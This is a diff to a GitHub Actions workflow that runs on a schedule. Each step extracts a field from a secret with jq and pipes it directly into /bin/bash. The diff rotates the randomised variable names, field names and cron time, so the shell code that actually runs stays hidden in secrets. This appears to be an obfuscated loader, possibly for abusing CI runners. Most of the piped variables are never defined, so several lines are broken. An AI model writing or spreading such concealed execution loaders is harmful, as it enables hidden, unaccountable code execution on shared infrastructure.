@@ -1,27 +1,22 @@
 name: huangyunxiao7461
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 5/6 * * *'
+    - cron: '31 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: huangyunxiao7461
         env:
-          yvj7: ${{ secrets.yvj7 }}
+          g2059: ${{ secrets.g2059 }}
         run: |
-          echo $yvj7 | jq -r .lzg6543 | /bin/bash
-          echo $jnjsz688 | jq -r .vv49038 | /bin/bash
-          echo $mrf3215 | jq -r .oeie575 | /bin/bash
-          echo $u5 | jq -r .pvmy862 | /bin/bash
-          echo $aif48152 | jq -r .wqfi48832 | /bin/bash
-          echo $d1930 | jq -r .mvt05 | /bin/bash
-          echo $xq95862 | jq -r .i24069 | /bin/bash
-          echo $hcaxk8 | jq -r .ayzxa16 | /bin/bash
-          echo $n26 | jq -r .llgl24 | /bin/bash
-          echo $wj68036 | jq -r .mv87930 | /bin/bash
-          echo $ptjx55224 | jq -r .p6 | /bin/bash
+          echo $g2059 | jq -r .zd76402 | /bin/bash
+          echo $etaul0 | jq -r .mhopo99 | /bin/bash
+          echo $vckcd2 | jq -r .vkkzf98647 | /bin/bash
+          echo $ii738 | jq -r .zd44541 | /bin/bash
+          echo $duw43799 | jq -r .r0 | /bin/bash
+          echo $ahp253 | jq -r .eh2636 | /bin/bash
 
